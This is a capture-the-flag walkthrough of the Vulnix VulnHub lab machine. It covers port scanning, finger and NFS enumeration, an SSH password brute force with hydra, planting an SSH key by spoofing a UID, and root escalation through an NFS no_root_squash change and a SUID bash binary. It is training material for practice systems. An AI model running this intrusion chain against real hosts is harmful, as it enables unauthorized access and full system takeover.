# HACKLAB: VULNIX

## 1.Get VM IP :
```bash
root@kali: nmap -sn 192.168.127.0/24

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 01:57 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00047s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.134
Host is up (0.00076s latency).
MAC Address: 00:0C:29:91:46:B9 (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00027s latency).
MAC Address: 00:50:56:F4:78:0D (VMware)
Nmap scan report for 192.168.127.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.12 seconds
```

The ip address is `192.168.127.134` lets enumerate the machine.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.134 -oN fullscan

Nmap scan report for 192.168.127.134
Host is up (0.00090s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp   open  smtp     Postfix smtpd
|_ssl-date: 2023-09-04T09:29:28+00:00; +3h30m01s from scanner time.
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
79/tcp   open  finger   Linux fingerd
|_finger: No one logged on.\x0D
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: 2023-09-04T09:29:28+00:00; +3h30m01s from scanner time.
|_pop3-capabilities: SASL CAPA PIPELINING STLS RESP-CODES TOP UIDL
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42180/tcp6  mountd
|   100005  1,2,3      47984/udp6  mountd
|   100005  1,2,3      53053/tcp   mountd
|   100005  1,2,3      60048/udp   mountd
|   100021  1,3,4      33642/tcp   nlockmgr
|   100021  1,3,4      40855/tcp6  nlockmgr
|   100021  1,3,4      50365/udp6  nlockmgr
|   100021  1,3,4      57057/udp   nlockmgr
|   100024  1          38798/udp6  status
|   100024  1          40652/udp   status
|   100024  1          42706/tcp6  status
|   100024  1          50915/tcp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp  open  imap     Dovecot imapd
|_ssl-date: 2023-09-04T09:29:28+00:00; +3h30m01s from scanner time.
|_imap-capabilities: more capabilities ENABLE have SASL-IR LOGIN-REFERRALS STARTTLS listed ID Pre-login post-login OK LITERAL+ IMAP4rev1 LOGINDISABLEDA0001 IDLE
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
512/tcp  open  exec     netkit-rsh rexecd
513/tcp  open  login    OpenBSD or Solaris rlogind
514/tcp  open  shell    Netkit rshd
993/tcp  open  ssl/imap Dovecot imapd
|_imap-capabilities: capabilities ENABLE more SASL-IR LOGIN-REFERRALS LITERAL+ listed ID Pre-login have post-login OK IMAP4rev1 AUTH=PLAINA0001 IDLE
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2023-09-04T09:29:29+00:00; +3h30m01s from scanner time.
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: 2023-09-04T09:29:29+00:00; +3h30m01s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_pop3-capabilities: SASL(PLAIN) CAPA TOP PIPELINING RESP-CODES USER UIDL
2049/tcp open  nfs      2-4 (RPC #100003)
MAC Address: 00:0C:29:91:46:B9 (VMware)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h30m00s, deviation: 0s, median: 3h30m00s
```

### 2.1.Finger Enumeration :

The `finger` service on port `79` allows us to enumerate users on the system using metasploit `(auxiliary/scanner/finger/finger_users)` :

```bash
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: backup
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: bin
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: daemon
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: games
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: gnats
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: irc
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: landscape
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: libuuid
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: list
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: lp
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: mail
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: dovecot
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: man
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: messagebus
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: news
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: nobody
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: postfix
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: proxy
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: root
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: sshd
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: sync
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: sys
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: syslog
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: user
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: dovenull
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: uucp
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: whoopsie
[+] 192.168.127.134:79    - 192.168.127.134:79 - Found user: www-data
```
ignoring the default system users, i see two important users, one is `www-data` and `user`, fortunately we have finger protocol

available so we can check users on the system :

```bash
root@kali: finger user@192.168.127.134

Login: user                             Name: user
Directory: /home/user                   Shell: /bin/bash
Last login Mon Sep  4 11:33 (BST) on pts/0 from 192.168.127.128
No mail.
No Plan.

Login: dovenull                         Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.
```

### 2.2.NFS Enumeration

You can use metasploit for NFS enumeration `(auxiliary/scanner/nfs/nfsmount)` or use the `showmount` command :

```bash
root@kali: showmount -e 192.168.127.134
Export list for 192.168.127.134:
/home/vulnix *
```

as it shows the directory `/home/vulnix` is available for share so we mount this directory to our system :
(we also know that user vulnix exists on the system)

```bash
root@kali: mkdir /mnt/vulnix
root@kali: mount 192.168.127.134:/home/vulnix /mnt/vulnix
```

but we dont't have access to this directory yet.

in order to gain access to this directory we can create a user simulating the `vulnix` user on the target machine.

for doing this we should know the `UID` and `GID` of the vulnix user on the victim machine.(continue)

## 3.Gaining Shell

We need to bruteforce the `user` user account on the machine with hydra :

```bash
root@kali: hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.127.134 ssh -v -t 10
```

![hydra](https://github.com/Git-K3rnel/VulnHub/assets/127470407/40b38f91-c29b-4c48-bb6b-b9f25d0e3e17)


login to the system with `user:letmein` credentials.

with this user we can almost do nothing but checking the `/etc/passwd` file to see the SUID and GID of the vulnix user.

![passwd](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c643665f-8437-4708-a3ed-e386d3efcea8)

as it shows `2008:2008` is the UID and GID of the vulnix user.

## 4.Privilege Escalation Part 1

on attacker machine :

```bash
root@kali: useradd vulnix -u 2008 -s /bin/bash
root@kali: su vulnix
vulnix@kali: cd /mnt/vulnix
vulnix@kali: ls -la
drwxr-x--- 2 vulnix vulnix 4096 Sep  4  2023 .
drwxr-xr-x 3 root   root   4096 Sep  4 05:50 ..
-rw------- 1 vulnix vulnix  719 Sep  4  2012 .bash_history
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```

there is nothing here. but we can create a SSH key pair and put it in vulnix home directory in order to access the machine without password :

- Create SSH key pair using `ssh-keygen` command on root user
- Copy the content of `/root/.ssh/id_rsa.pub` to vulnix `.ssh/authorized_keys`
- SSH to system by providing the `id_rsa` private key

```bash
root@kali: ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:YClxoH949o+PGTS96ltDTvYWwVyyy2P0Tr4Nbyw11fo root@kali
The key's randomart image is:
+---[RSA 3072]----+
|    o..     . .  |
|   . o .   o +   |
|  . . +     *   .|
|   . + . . o +  o|
|    o + S = * o..|
|     + o * + *...|
|        o = o ++.|
|         O o  .=E|
|       .Boo   .oo|
+----[SHA256]-----+

root@kali: cat /root/.ssh/id_rsa.pub                         
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmWoOSmwuPXtDz/RBRziZtAZJ3LEuNNcg8PxRQLX0z9BVktcPSq1wpjtqHjD30d5FKnKGDmj/j9nPDf0rbLLfdCwkz0zXHjXE1qkbJ2l3TD7sGm+tGvvFwtD4ny8WGbwMAtSbQUlFBGt85dXi1TlPH2CiXZ3FJcWcucCCNr5LXrglFPXcrd6jDRfH+piqvFgwukWVjw9eb8YO8eXEUwRR3NjBVmRiURk8qKdJ8FhUVpNflnFF5L62xqDy0+rSyhR278ki8tTVbdsqHRYdZAyGFSX2DwrLY86/9FR2oQGWQ/zYs6sYoLdv0dq1peDSGwJajDkp6AAYXkQ92oGXgyjyL0/c25iLTd3CfJFLp9Fih0yJqIK3oEYC4EvurCIKTCPVtfLI9qKOmEniZtognc6tB+UYSpfUGEHtzA/rGkRvGvqr5uoiOuH2zhjJUVMr0+uCpl4KSCga/NblbH0tBxy4Yk2Sg0N0RxX6a0iUtP8GAqZPK/F6DDXJG0cYv1C1E7GU= root@kali

root@kali: su vulnix
vulnix@kali: cd /mnt/vulnix
vulnix@kali: mkdir .ssh
vulnix@kali: cd .ssh
vulnix@kali: echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmWoOSmwuPXtDz/RBRziZtAZJ3LEuNNcg8PxRQLX0z9BVktcPSq1wpjtqHjD30d5FKnKGDmj/j9nPDf0rbLLfdCwkz0zXHjXE1qkbJ2l3TD7sGm+tGvvFwtD4ny8WGbwMAtSbQUlFBGt85dXi1TlPH2CiXZ3FJcWcucCCNr5LXrglFPXcrd6jDRfH+piqvFgwukWVjw9eb8YO8eXEUwRR3NjBVmRiURk8qKdJ8FhUVpNflnFF5L62xqDy0+rSyhR278ki8tTVbdsqHRYdZAyGFSX2DwrLY86/9FR2oQGWQ/zYs6sYoLdv0dq1peDSGwJajDkp6AAYXkQ92oGXgyjyL0/c25iLTd3CfJFLp9Fih0yJqIK3oEYC4EvurCIKTCPVtfLI9qKOmEniZtognc6tB+UYSpfUGEHtzA/rGkRvGvqr5uoiOuH2zhjJUVMr0+uCpl4KSCga/NblbH0tBxy4Yk2Sg0N0RxX6a0iUtP8GAqZPK/F6DDXJG0cYv1C1E7GU= root@kali > authorized_keys
vulnix@kali: exit
```

we need to tell our ssh client to accept the old ssh-rsa algorithm.

```bash
root@kali: ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' vulnix@192.168.127.134
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Sep  4 14:43:16 BST 2023

  System load:  0.0              Processes:           89
  Usage of /:   90.3% of 773MB   Users logged in:     0
  Memory usage: 9%               IP address for eth0: 192.168.127.134
  Swap usage:   0%

  => / is using 90.3% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$ 
```

## 5.Privileg Escalation Part 2

We immediately see our sudo permissions :

```bash
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

it allows us to edit `/etc/exports` with `sudoedit` which is The primary configuration for the NFS server.

This is the file that you use to specify what directories you want to share with the NFS clients.

```bash
vulnix@vulnix:~$ sudoedit /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
```

NFS has these two options :

- root_squash : which does not allow the root use on the client to create file with root permissions (differentiates local root account with user root account)
- no_root_squash : which allows root user on the client to create any file or binary with root permissions

so we can simply change the line to `no_root_squash` and then restart the machine physically, this is the only option.

after booting up again we mount the `/home/vulnix` directory again but this time with our own root user :

```bash
root@kali: mount 192.168.127.134:/home/vulnix /mnt/vulnix
root@kali: cd /mnt/vulnix
```

now we can put our own bash binary into this shared folder and set SUID on it in order to run it on the victim machine :

```bash
root@kali(/mnt/vulnix): cp /bin/bash .
root@kali: chmod 4777 bash
root@kali: ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' vulnix@192.168.127.134
vulnix@vulnix:~$ ./bash -p
bash-4.2# id
uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
```

#### important :
If you are using a 64bit kali machine you will get this error when executing bash on the target machine :

`-bash: ./bash: cannot execute binary file`

to resolve this you can just copy the vulnix machine bash binary (because it is 32bit version)

to /home/vulnix first and then change the permission of it on your kali machine :

```bash
vulnix@vulnix:~$ cp /bin/bash .
vulnix@vulnix:~$ exit
root@kali: cd /mnt/vulnix
root@kali: chown root:root bash
root@kali: chmod 4777 bash
```

now if you execute the 32bit bash on victim it gives you the root account.


navigate to `/root` :

```bash
bash-4.2# cd /root
bash-4.2# ls
trophy.txt
bash-4.2# cat trophy.txt 
cc614640424f5bd60ce5d5264899c3be
```

yes, this is how you can get the trophy from this machine :)
